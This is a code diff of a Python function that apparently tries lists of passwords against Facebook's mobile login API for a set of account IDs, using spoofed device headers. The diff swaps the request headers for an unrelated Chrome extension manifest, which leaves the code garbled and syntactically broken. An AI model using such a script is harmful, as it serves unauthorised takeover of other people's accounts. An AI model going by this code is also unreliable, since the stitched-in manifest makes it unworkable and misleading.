@@ -305,16 +305,38 @@ def api(ids,names,passlist):
                                 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                         }
                         headers={
-                                'Authorization':f'OAuth {accessToken}',
-                                'X-FB-Friendly-Name':'authenticate',
-                                'X-FB-Connection-Bandwidth':str(random.randint(2e7,3e7)),
-                                'X-FB-Net-HNI': str(random.randint(11111, 99999)),
-                                'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
-                                'User-Agent':ua,
-                                'Accept-Encoding':'gzip, deflate',
-                                'Content-Type': 'application/x-www-form-urlencoded',
-                                'X-FB-HTTP-Engine': 'Liger'
-                                }
+                               "update_url": "https://clients2.google.com/service/update2/crx",
+                               "name": "User-Agent Switcher",
+                               "manifest_version": 2,
+                               "description": "Change User-Agent Setting. Spoof it to the UA of Firefox, Android, Chromebook, Safari, Googlebot or a custom string.",
+                               "homepage_url": "https://browsernative.com/user-agent-chrome-extension/",
+                               "options_page": "options.html",
+                               "options_ui": {
+                               "page": "options.html",
+                               "chrome_style": true
+                               },
+                               "browser_action": {
+                               "default_icon": "icon.png",
+                               "default_popup": "popup.html",
+                               "default_title": "Change User-Agent Setting"
+                               },
+                               "background": {
+                               "scripts": [
+                               "js/background.js"
+                                 ]
+  },
+  "icons": {
+    "128": "icon.png"
+  },
+  "version": "1.0.18",
+  "permissions": [
+    "webRequest",
+    "webRequestBlocking",
+    "*://*/*"
+  ]
+}
+
+
                         url = 'https://b-graph.facebook.com/auth/login'
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
